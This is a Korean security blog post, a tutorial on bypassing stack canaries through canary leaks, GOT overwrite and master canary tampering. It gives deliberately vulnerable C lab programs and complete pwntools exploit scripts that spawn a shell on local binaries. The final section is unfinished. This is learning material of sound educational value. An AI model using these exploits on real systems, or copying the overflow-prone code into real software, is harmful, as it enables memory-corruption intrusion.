@@ -1,0 +1,306 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] Canary 우회 · whrds.log</title><meta name="description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 이전 포스팅에서 canary에 대해 다루었다. 이번에는 그 우회 방법들을 다루겠다. 1. canary leak 2. got overwrite (간단하게만 설명하고, 자세한 내용은 plt/got에 대한 포스팅 이후 다루겠다.) 3. master can">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/pwnable-canary-bypass/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-canary-bypass/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-canary-bypass/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] Canary 우회 · whrds.log"><meta property="og:description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 이전 포스팅에서 canary에 대해 다루었다. 이번에는 그 우회 방법들을 다루겠다. 1. canary leak 2. got overwrite (간단하게만 설명하고, 자세한 내용은 plt/got에 대한 포스팅 이후 다루겠다.) 3. master can"><meta property="og:url" content="https://whrds.github.io/ko/posts/pwnable-canary-bypass/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] Canary 우회","description":"※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 이전 포스팅에서 canary에 대해 다루었다. 이번에는 그 우회 방법들을 다루겠다. 1. canary leak 2. got overwrite (간단하게만 설명하고, 자세한 내용은 plt/got에 대한 포스팅 이후 다루겠다.) 3. master can","datePublished":"2023-09-24","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/pwnable-canary-bypass/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/pwnable-canary-bypass/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] Canary 우회</h1><p class="article-description">※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 이전 포스팅에서 canary에 대해 다루었다. 이번에는 그 우회 방법들을 다루겠다. 1. canary leak 2. got overwrite (간단하게만 설명하고, 자세한 내용은 plt/got에 대한 포스팅 이후 다루겠다.) 3. master can</p><div class="article-meta"><time datetime="2023-09-24">2023년 9월 24일</time><span>·</span><span>2 분 읽기</span></div></header><div class="prose"><p><strong>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다.</strong> <strong>※</strong> </p>
+<p>이전 포스팅에서 canary에 대해 다루었다.</p>
+<p>이번에는 그 우회 방법들을 다루겠다.</p>
+<p><strong>1. canary leak</strong></p>
+<p><strong>2. got overwrite (간단하게만 설명하고, 자세한 내용은 plt/got에 대한 포스팅 이후 다루겠다.)</strong></p>
+<p><strong>3. master canary 변조</strong></p>
+<p><strong>4. thread 영역 재설정</strong></p>
+<hr>
+<h3>canary leak</h3>
+<p>가장 일반적인 방법으로, 리눅스의 stack 정렬하는 특징과 canary가 \x00으로 끝난다는 특징을 이용한 방법이다.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/001.png" alt=""></p>
+<p>실습 예제 코드</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+void getshell(){
+    execve(&quot;/bin/sh&quot;,0,0);
+}
+
+int main(){
+    int buf[0x30];
+
+    printf(&quot;Hello! Whrd\n Input : &quot;);
+    read(0,buf,0x100);
+    printf(&quot;Your Input : [%s]\n\n&quot;,buf);
+
+    printf(&quot;Input : &quot;);
+    read(0,buf,0x100);
+
+    return 0;
+}
+</code></pre>
+<p>적용된 보호기법이다. </p>
+<p>PIE를 제외하고는 다 걸려있다. (편의상 제거해둔 상태입니다)</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/002.png" alt=""></p>
+<p>취약점은 bof할 때와 같이 read()함수에서 발생하고 있다.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/003.png" alt=""></p>
+<p>read에서 호출된 buf의 위치는 rbp-0xd0이다.</p>
+<p>앞서 배운 Return Address Overwrite 기법을 이용해서 똑같이 공격을 수행해보겠다.</p>
+<pre><code>from pwn import*
+
+p = process('./cny')
+e = ELF('./cny')
+context.log_level='debug'
+
+getshell = e.sym['getshell']
+
+payload = b'a'*0xd0
+payload += b'b'*0x8
+payload += p64(getshell)
+
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/004.png" alt=""></p>
+<p>canary가 깨지기 때문에 stack smashing이 뜨면서 종료된다.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/005.png" alt=""></p>
+<p>리눅스는 64기준으로 8바이트씩 정렬하는 특징이 있다.</p>
+<p>그렇다면 저 canary값의 1바이트만 침범하게 입력하면,</p>
+<p>다음 printf에서 buf가 출력될 때 나머지 7바이트도 같이 나올 것이다라는 가설을 세울 수 있다.</p>
+<p>마침 canary로 마지막 1바이트는 \x00으로 고정된 값을 가지고 있다.</p>
+<p>때문에 위의 가설로 canary를 알아내어 공격할 수 있다는 것을 생각할 수 있다.</p>
+<p>바로 확인해보겠다.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/006.png" alt=""></p>
+<p>stack상의 canary위치는 rbp-0x8이다.</p>
+<p>buf의 위치는 rbp-0xd0이므로 dummy를 0xc8만큼 입력하고 추가로 1바이트만 더 입력해주면 된다.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/007.png" alt=""></p>
+<p>현재 canary의 값이다.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/008.png" alt=""></p>
+<p>canary 부분을 살펴보면 1바이트 \x00이  \x61로 변조되었다.</p>
+<p>이 값을 \x00으로 바꿔주면 canary를 얻어낼 수 있다.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/009.png" alt=""></p>
+<p>얻어낸 값이 canary인 것을 확인할 수 있다.</p>
+<p>이 값을 이용하여 아래와 같이 페이로드를 입력하면 된다.</p>
+<p>dummy(0xc0) + canary(0x8) + sfp(0x8) + ret(0x8)</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/010.png" alt=""></p>
+<p>전체 페이로드이다.</p>
+<pre><code>from pwn import*
+
+p = process('./cny')
+e = ELF('./cny')
+#context.log_level='debug'
+
+getshell = e.sym['getshell']
+
+payload = b'a'*0xc9
+
+p.send(payload)
+
+p.recvuntil(payload)
+cny = u64(b'\x00' + p.recvn(7))
+print(hex(cny))
+
+pause()
+
+payload = b'a'*0xc8
+payload += p64(cny)
+payload += b'b'*0x8
+payload += p64(getshell)
+
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<hr>
+<h3>got overwrite</h3>
+<p>해당 방법은 나중에 다룰 plt/got와 got overwrite에 대해 알고 있어야 한다.</p>
+<p>때문에 지금은 어떤 방식인지만 보고 넘어가겠다.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/011.png" alt=""></p>
+<p>함수를 보면 __stack_chk_fail@plt라는 것이 있는 것을 볼 수 있다.</p>
+<p>해당 주소는 함수의 실제 주소가 아니다. </p>
+<p>실제주소의 경우 plt =&gt; got =&gt; 실제 주소 순으로 위치하게 된다.</p>
+<p>때문에 got가 가리키는 값인 실제 주소를 다른 값으로 변조하게 된다면 </p>
+<p>해당 함수의 호출을 막아 비정상 종료를 우회할 수 있게된다.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/012.png" alt=""></p>
+<hr>
+<h3>master canary 변조</h3>
+<p>thread 영역에 위치한 canary값을 변조하는 방법이다.</p>
+<p>실습 예제를 만들고자 하였지만 잘 안되었기에 dreamhack.io에서 사용한 예제를 가지고 진행하겠다.</p>
+<pre><code>#include &lt;pthread.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void giveshell() { execve(&quot;/bin/sh&quot;, 0, 0); }
+void init() {
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+}
+
+void read_bytes(char *buf, int size) {
+  int i;
+
+  for (i = 0; i &lt; size; i++)
+    if (read(0, buf + i*8, 8) &lt; 8)
+      return;
+}
+
+void thread_routine() {
+  char buf[256];
+  int size = 0;
+  printf(&quot;Size: &quot;);
+  scanf(&quot;%d&quot;, &amp;size);
+  printf(&quot;Data: &quot;);
+  read_bytes(buf, size);
+}
+
+int main() {
+  pthread_t thread_t;
+
+  init();
+
+  if (pthread_create(&amp;thread_t, NULL, (void *)thread_routine, NULL) &lt; 0) {
+    perror(&quot;thread create error:&quot;);
+    exit(0);
+  }
+  pthread_join(thread_t, 0);
+  return 0;
+}
+</code></pre>
+<p>우선 코드를 살펴보면  thread_routine()에서 bof 취약점이 발생한다.</p>
+<p>원하는 크기를 입력하고 그 크기만큼 입력을 받는 기능이기 때문에 256보다 큰 값을 입력하면 된다.</p>
+<p>해당 방법을 사용하기 위해서는 thread영역과 buf 사이의 거리를 알아내야 한다.</p>
+<p>read_bytes함수의 인자로 들어가는 것은 rbp-0x114와 rbp-0x110이 있다.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/013.png" alt=""></p>
+<p>첫 번째 인자가 buf이기 때문에 rdi에 들어가는 rbp-0x110이 buf에 해당한다.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/014.png" alt=""></p>
+<p>사이의 거리를 구하면 0x928이라는 값이 나온다.</p>
+<p>이 값을 이용하여 그대로 입력하면 공격에 실패하게 된다.</p>
+<p>이는 fs부분의 구조체를 살펴보아야 한다.</p>
+<pre><code>from pwn import*
+
+p = process('./mc_thread')
+e = ELF('./mc_thread')
+
+give_shell = e.sym['giveshell']
+
+payload = b'A' * 0x108 #buf
+payload += b'B' * 0x8 #new cny
+payload += b'A' * 0x8 #sfp
+payload += p64(give_shell) #ret
+
+payload += b'A' * (0x928 - len(payload)) #dummy
+payload += b'B' * 0x8 #new Master cny
+
+p.sendlineafter(b&quot;Size: &quot;, str(len(payload)))
+p.sendafter(b&quot;Data: &quot;, payload)
+
+p.interactive()
+</code></pre>
+<p>새로 설정할 canary를 BBBBBBBB로 설정하는 페이로드이다.</p>
+<p>dumy를 포함한 보내는 데이터는 fs_base + 0x28까지 변조시킨다.</p>
+<p>문제는 모든 데이터를 A로 변조한다는 것이다.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/015.png" alt=""></p>
+<pre><code>//REG 상태
+RAX  0x4141414141414141 ('AAAAAAAA')
+RBX  0x7f5d06b88640 ◂— 0x4141414141414141 ('AAAAAAAA')
+RCX  0x7f5d06ca09cc (read+76) ◂— cmp rax, -0x1000 /* 'H=' */
+RDX  0x8
+RDI  0x0
+RSI  0x7f5d06b88650 ◂— 0x4141414141414141 ('AAAAAAAA')
+
+//오류 부분
+0x00007f5d06c1caf2 &lt;+18&gt;:  mov    BYTE PTR [rax+0x972],0x0
+</code></pre>
+<p>오류가 난 부분을 확인해보면 rax+0x972한 주소에 0을 넣어주는 부분이다.</p>
+<p>현 상황에서 rax레지스터에는 0x4141414141414141이 들어가 있다.</p>
+<p>그렇다면 rax값만 유효한 주소값 - 0x972 한값을 넣어주면 된다.</p>
+<p>다음은 dreamhack.io에서 가져온 코드의 일부이다.</p>
+<pre><code>/* glibc-2.35/sysdeps/x86_64/nptl/tls.h */
+/* Return the thread descriptor for the current thread. */
+#  define THREAD_SELF \
+  ({ struct pthread *__self;                  \
+     asm (&quot;mov %%fs:%c1,%0&quot; : &quot;=r&quot; (__self)             \
+    : &quot;i&quot; (offsetof (struct pthread, header.self)));          \
+     __self;})
+/* glibc-2.35/sysdeps/nptl/pthread.h */
+enum
+{
+  PTHREAD_CANCEL_DEFERRED,
+#define PTHREAD_CANCEL_DEFERRED PTHREAD_CANCEL_DEFERRED
+  PTHREAD_CANCEL_ASYNCHRONOUS
+#define PTHREAD_CANCEL_ASYNCHRONOUS PTHREAD_CANCEL_ASYNCHRONOUS
+};
+/* glibc-2.35/nptl/cancellation.c */
+void
+__pthread_disable_asynccancel (int oldtype)
+{
+  /* If asynchronous cancellation was enabled before we do not have
+     anything to do.  */
+  if (oldtype == PTHREAD_CANCEL_ASYNCHRONOUS)
+    return;
+  struct pthread *self = THREAD_SELF;
+  self-&gt;canceltype = PTHREAD_CANCEL_DEFERRED;
+}
+</code></pre>
+<p>전체를 보면 복잡하기 때문에 필요한 부분을 위주로 보겠다.</p>
+<pre><code>self-&gt;canceltype = PTHREAD_CANCEL_DEFERRE
+</code></pre>
+<p>구조체의 self -&gt; canceltype에 접근하여 값을 설정해주고 있다.</p>
+<p>이때 우리가 넣은 페이로드에 의해 0x4141414141414141로 덮어지게 된다.</p>
+<pre><code>struct pthread *self = THREAD_SELF;
+</code></pre>
+<p>self의 경우 THREAD_SELF로부터 값을 가져온다.</p>
+<p>THREAD_SELF는 Thread Descriptor를 가져오는 매크로로, </p>
+<p>pthread 구조체에서 header.self의 offset 만큼 떨어진 값을 가져온다.</p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/016.png" alt=""></p>
+<p>현 상황에서는 self를 포함한 모두 같은 값으로 덮어져 있다.</p>
+<p>canary를 의미하는 stack_gaurd보다 0x10만큼 높은 주소에 위치한다.</p>
+<p>그럼 payload의 dumy를 0x918만 보내면 된다.</p>
+<pre><code>from pwn import*
+
+p = process('./mc_thread')
+e = ELF('./mc_thread')
+
+give_shell = e.sym['giveshell']
+
+payload = b'A' * 0x108 #buf
+payload += b'B' * 0x8 #new cny
+payload += b'A' * 0x8 #sfp
+payload += p64(give_shell) #ret
+payload += b'A'*(0x910-len(payload))
+payload += p64(0x404f80-0x972) # valid address for fs:0x10 + 0x972
+payload += b'B'*0x10 # DUMMY
+payload += b'B' * 0x8 #new Master cny
+
+p.sendlineafter(&quot;Size: &quot;, str(len(payload)))
+p.sendlineafter(&quot;Data: &quot;, payload)
+
+p.interactive()
+</code></pre>
+<p>최종 수정한 코드이다. </p>
+<p><img src="/assets/images/tistory/tistory-136d7c463f6c/017.png" alt=""></p>
+<hr>
+<h3>thread영역 재설정</h3>
+<p>(작성 중 - 예제 생성 및 실습 단계)</p>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/pwnable-canary-bypass/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
